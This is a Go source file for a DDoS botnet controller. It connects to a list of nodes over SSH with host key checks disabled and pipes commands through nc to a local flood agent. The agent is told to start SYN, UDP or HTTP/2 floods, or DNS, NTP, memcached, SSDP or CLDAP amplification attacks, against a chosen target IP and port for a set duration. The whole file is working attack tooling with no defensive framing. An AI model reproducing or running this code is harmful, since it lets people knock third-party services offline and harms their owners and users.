package main

import (
	"bufio"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

type Node struct {
	Host string
	Port string
	User string
	Key  string
}

func dialNode(n Node) (*ssh.Client, error) {
	key, err := os.ReadFile(n.Key)
	if err != nil {
		return nil, err
	}
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		return nil, err
	}
	cfg := &ssh.ClientConfig{
		User:            n.User,
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}
	return ssh.Dial("tcp", n.Host+":"+n.Port, cfg)
}

func runCmd(c *ssh.Client, cmd string) (string, error) {
	s, err := c.NewSession()
	if err != nil {
		return "", err
	}
	defer s.Close()
	out, err := s.CombinedOutput(cmd)
	return string(out), err
}

func main() {
	nodesFile := flag.String("nodes", "nodes.txt", "file with host port user key")
	cmd := flag.String("cmd", "", "start|stop|stats|ping")
	vector := flag.String("vector", "syn", "syn|udp|http2")
	target := flag.String("target", "", "target IP or host")
	port := flag.Uint("port", 80, "target port")
	amp := flag.String("amp", "dns", "dns|ntp|memcached|ssdp|cldap")
	workers := flag.Int("workers", 64, "per-node concurrency")
	token := flag.String("token", "", "shared auth token")
	duration := flag.Duration("duration", 60*time.Second, "how long to run")
	flag.Parse()

	if *token == "" {
		*token = os.Getenv("FLOOD_TOKEN")
	}

	var nodes []Node
	f, err := os.Open(*nodesFile)
	if err != nil {
		fmt.Fprintln(os.Stderr, "nodes file:", err)
		os.Exit(1)
	}
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		p := strings.Fields(line)
		if len(p) < 4 {
			continue
		}
		nodes = append(nodes, Node{Host: p[0], Port: p[1], User: p[2], Key: p[3]})
	}
	f.Close()

	if len(nodes) == 0 {
		fmt.Fprintln(os.Stderr, "no nodes")
		os.Exit(1)
	}

	fmt.Printf("[*] %d nodes, cmd=%s\n", len(nodes), *cmd)

	startBody := map[string]interface{}{
		"vector":  *vector,
		"target":  *target,
		"port":    *port,
		"amp":     *amp,
		"workers": *workers,
	}
	startJSON, _ := json.Marshal(startBody)

	var wg sync.WaitGroup
	var mu sync.Mutex
	ids := make(map[string]string)

	for _, n := range nodes {
		wg.Add(1)
		go func(n Node) {
			defer wg.Done()
			c, err := dialNode(n)
			if err != nil {
				fmt.Printf("[-] %s: %v\n", n.Host, err)
				return
			}
			defer c.Close()

			var out string
			switch *cmd {
			case "start":
				out, _ = runCmd(c, fmt.Sprintf(
					"echo '%s start %s' | nc -w 3 127.0.0.1 9999", *token, startJSON))
				id := strings.TrimSpace(strings.TrimPrefix(out, "ok "))
				mu.Lock()
				ids[n.Host] = id
				mu.Unlock()
				fmt.Printf("[+] %s -> %s\n", n.Host, id)
			case "stop":
				mu.Lock()
				id := ids[n.Host]
				mu.Unlock()
				runCmd(c, fmt.Sprintf("echo '%s stop %s' | nc -w 3 127.0.0.1 9999",
					*token, id))
				fmt.Printf("[+] %s stopped\n", n.Host)
			case "stats":
				out, _ = runCmd(c, fmt.Sprintf("echo '%s stats' | nc -w 3 127.0.0.1 9999", *token))
				fmt.Printf("[*] %s: %s\n", n.Host, out)
			case "ping":
				out, _ = runCmd(c, fmt.Sprintf("echo '%s ping' | nc -w 3 127.0.0.1 9999", *token))
				fmt.Printf("[*] %s: %s\n", n.Host, out)
			}
		}(n)
	}
	wg.Wait()

	if *cmd == "start" && *duration > 0 {
		fmt.Printf("[*] running for %s...\n", *duration)
		time.Sleep(*duration)
		var wg2 sync.WaitGroup
		for _, n := range nodes {
			wg2.Add(1)
			go func(n Node) {
				defer wg2.Done()
				c, err := dialNode(n)
				if err != nil {
					return
				}
				defer c.Close()
				mu.Lock()
				id := ids[n.Host]
				mu.Unlock()
				runCmd(c, fmt.Sprintf("echo '%s stop %s' | nc -w 3 127.0.0.1 9999",
					*token, id))
				out, _ := runCmd(c, fmt.Sprintf(
					"echo '%s stats' | nc -w 3 127.0.0.1 9999", *token))
				fmt.Printf("[*] %s final: %s\n", n.Host, out)
			}(n)
		}
		wg2.Wait()
	}
}
